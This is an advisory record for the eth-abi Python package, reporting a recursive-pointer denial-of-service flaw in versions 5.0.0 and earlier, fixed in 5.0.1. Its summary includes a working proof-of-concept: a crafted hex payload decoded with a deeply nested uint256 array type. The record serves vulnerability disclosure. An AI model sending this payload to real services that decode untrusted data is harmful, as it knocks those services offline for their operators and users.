advisory_id: GHSA-3qwc-47jf-5rf7
datasource_id: github_osv_importer_v2/GHSA-3qwc-47jf-5rf7
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-3qwc-47jf-5rf7/GHSA-3qwc-47jf-5rf7.json
aliases: []
summary: |
  eth-abi is vulnerable to recursive DoS
  This is related to recent ZST stuff (https://github.com/ethereum/eth-abi/security/advisories/GHSA-rqr8-pxh7-cq3g), but it's a different one. Basically a recursive pointer issue

  ```py
  from eth_abi import decode


  payload = "0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000020"

  # OverflowError: Python int too large to convert to C ssize_t
  #decode(['(uint256[][][][][][][][][][])'], bytearray.fromhex(payload))

  decode(['uint256[][][][][][][][][][]'], bytearray.fromhex(payload+('00' * 1024)))
  ```
impacted_packages:
  - purl: pkg:pypi/eth-abi
    affected_versions: vers:pypi/<=5.0.0
    fixed_versions: vers:pypi/5.0.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses: []
references:
  - url: https://github.com/ethereum/eth-abi
    reference_type:
    reference_id:
  - url: https://github.com/ethereum/eth-abi/commit/82c1ad37a866472562d81fedaef0f4fed0a08269
    reference_type:
    reference_id:
  - url: https://github.com/ethereum/eth-abi/security/advisories/GHSA-3qwc-47jf-5rf7
    reference_type:
    reference_id:
